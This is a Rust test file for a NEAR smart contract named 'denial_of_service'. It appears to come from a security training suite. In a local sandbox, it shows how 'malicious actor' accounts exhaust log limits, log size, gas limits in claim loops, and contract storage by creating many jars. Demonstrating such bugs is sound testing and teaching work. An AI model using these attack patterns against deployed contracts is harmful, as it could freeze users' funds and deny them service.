use near_sdk::{env, json_types::U128, near, AccountId, NearToken};
use near_workspaces::{
    operations::Function, types::SecretKey, Account, Contract,
};
use serde_json::json;

const DENIAL_OF_SERVICE: &[u8] =
    include_bytes!("../../res/denial_of_service.wasm");

#[near(serializers = [borsh, json])]
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub struct MoneyJar {
    pub amount: U128,
    pub id: String,
}

struct Env {
    owner: Account,
    malicious_actor: Account,
    malicious_actor2: Account,
    denial_of_service_contract: Contract,
}

async fn prepare() -> color_eyre::Result<Env> {
    let sandbox = near_workspaces::sandbox().await?;

    let owner = sandbox.dev_create_account().await?;
    let malicious_actor = sandbox.dev_create_account().await?;

    let malicious_actor2 = sandbox.dev_create_account().await?;

    let storage_collisions_contract =
        sandbox.dev_deploy(&DENIAL_OF_SERVICE).await?;

    println!(
        "STORAGE_KEY_COLLISION_CONTRACT: {}\n",
        storage_collisions_contract.id()
    );

    storage_collisions_contract
        .call("new")
        .args_json(json!({"managers": vec![owner.id()]}))
        .transact()
        .await?
        .into_result()?;

    Ok(Env {
        owner,
        malicious_actor,
        malicious_actor2,
        denial_of_service_contract: storage_collisions_contract,
    })
}

#[tokio::test]
async fn log_limit_dos() -> color_eyre::Result<()> {
    let Env {
        malicious_actor,
        malicious_actor2,
        denial_of_service_contract,
        owner,
    } = prepare().await?;

    let total_jars = (0..105)
        .map(|i| (U128(NearToken::from_near(2).as_yoctonear()), U128(i)))
        .collect::<Vec<_>>();

    let (jars_1, jars_2) = total_jars.split_at(100);

    malicious_actor
        .call(denial_of_service_contract.id(), "batch_create_jars")
        .args_json(json!({"jars": jars_1}))
        .max_gas()
        .transact()
        .await?
        .into_result()?;

    malicious_actor2
        .call(denial_of_service_contract.id(), "batch_create_jars")
        .args_json(json!({"jars": jars_2}))
        .max_gas()
        .transact()
        .await?
        .into_result()?;

    denial_of_service_contract
        .call("add_reward_to_each_jar")
        .args_json(
            json!({"account_ids": vec![(malicious_actor.id(), U128(10000)), (malicious_actor2.id(), U128(30000))]}),
        ).max_gas()
        .transact()
        .await?
        .into_result()?;

    Ok(())
}

#[tokio::test]
async fn log_size_dos() -> color_eyre::Result<()> {
    let Env {
        malicious_actor,
        malicious_actor2,
        denial_of_service_contract,
        ..
    } = prepare().await?;

    let total_jars = (0..125)
        .map(|i| (U128(NearToken::from_near(2).as_yoctonear()), U128(i)))
        .collect::<Vec<_>>();

    let (jars_1, jars_2) = total_jars.split_at(120);

    malicious_actor
        .call(denial_of_service_contract.id(), "batch_create_jars")
        .args_json(json!({"jars": jars_1}))
        .max_gas()
        .transact()
        .await?
        .into_result()?;

    malicious_actor2
        .call(denial_of_service_contract.id(), "batch_create_jars")
        .args_json(json!({"jars": jars_2}))
        .max_gas()
        .transact()
        .await?
        .into_result()?;

    denial_of_service_contract
        .call("add_reward_to_each_jar_log_size_limit")
        .args_json(
            json!({"account_ids": vec![(malicious_actor.id(), U128(10000)), (malicious_actor2.id(), U128(30000))]}),
        ).max_gas()
        .transact()
        .await?
        .into_result()?;

    Ok(())
}

#[tokio::test]
async fn gas_limit_dos() -> color_eyre::Result<()> {
    let Env {
        malicious_actor,
        malicious_actor2,
        denial_of_service_contract,
        ..
    } = prepare().await?;

    let total_jars = (0..1000)
        .map(|i| (U128(NearToken::from_millinear(2).as_yoctonear()), U128(i)))
        .collect::<Vec<_>>();

    let (jars_1, jars_2) = total_jars.split_at(800);

    for _ in 0..10 {
        malicious_actor
            .call(denial_of_service_contract.id(), "batch_create_jars")
            .args_json(json!({"jars": jars_1}))
            .max_gas()
            .transact()
            .await?
            .into_result()?;
    }

    malicious_actor2
        .call(denial_of_service_contract.id(), "batch_create_jars")
        .args_json(json!({"jars": jars_2}))
        .max_gas()
        .transact()
        .await?
        .into_result()?;

    malicious_actor2
        .call(denial_of_service_contract.id(), "claim_all_jars")
        .args_json(json!({}))
        .max_gas()
        .transact()
        .await?
        .into_result()?;

    malicious_actor
        .call(denial_of_service_contract.id(), "claim_all_jars")
        .args_json(json!({}))
        .max_gas()
        .transact()
        .await?
        .into_result()?;

    Ok(())
}

#[tokio::test]
async fn storage_bloating_dos() -> color_eyre::Result<()> {
    let Env {
        malicious_actor,
        denial_of_service_contract,
        ..
    } = prepare().await?;

    // Transferring out some NEAR to make exploitation faster
    denial_of_service_contract
        .as_account()
        .transfer_near(
            malicious_actor.id(),
            NearToken::from_yoctonear(97_520_000_000_000_000_000_000_000),
        )
        .await?
        .into_result()?;

    for i in 0..100 {
        let storage_usage_before = denial_of_service_contract
            .view_account()
            .await?
            .storage_usage;

        let data = malicious_actor
            .call(denial_of_service_contract.id(), "create_jar")
            .args_json(json!({"amount": U128(NearToken::from_near(2).as_yoctonear()), "id": U128(i)}))
            .transact().await?.into_result()?;

        let tokens_burnt = data.outcome().tokens_burnt.as_yoctonear();
        let smart_contract_gain = tokens_burnt * 30 / 100;

        let storage_usage_after = denial_of_service_contract
            .view_account()
            .await?
            .storage_usage;

        let current_storage_cost_in_near = storage_usage_after as u128
            * env::storage_byte_cost().as_yoctonear();

        let bytes_per_storage_addition =
            (storage_usage_after - storage_usage_before) as u128;

        let cost_per_storage_addition = bytes_per_storage_addition as u128
            * env::storage_byte_cost().as_yoctonear();

        let free_balance = denial_of_service_contract
            .view_account()
            .await?
            .balance
            .as_yoctonear()
            - current_storage_cost_in_near;

        assert!(smart_contract_gain < cost_per_storage_addition);

        println!(
            "Cost per storage write {cost_per_storage_addition} || Attacker \
             cost per iteration: {tokens_burnt} || Storage added: \
             {bytes_per_storage_addition}\n || Contract Storage: \
             {storage_usage_after} || Contract Storage Cost: \
             {current_storage_cost_in_near}|| Contract Gained Per Iteration: \
             {smart_contract_gain}\n || Free Balance: {free_balance}\n"
        );
    }

    Ok(())
}
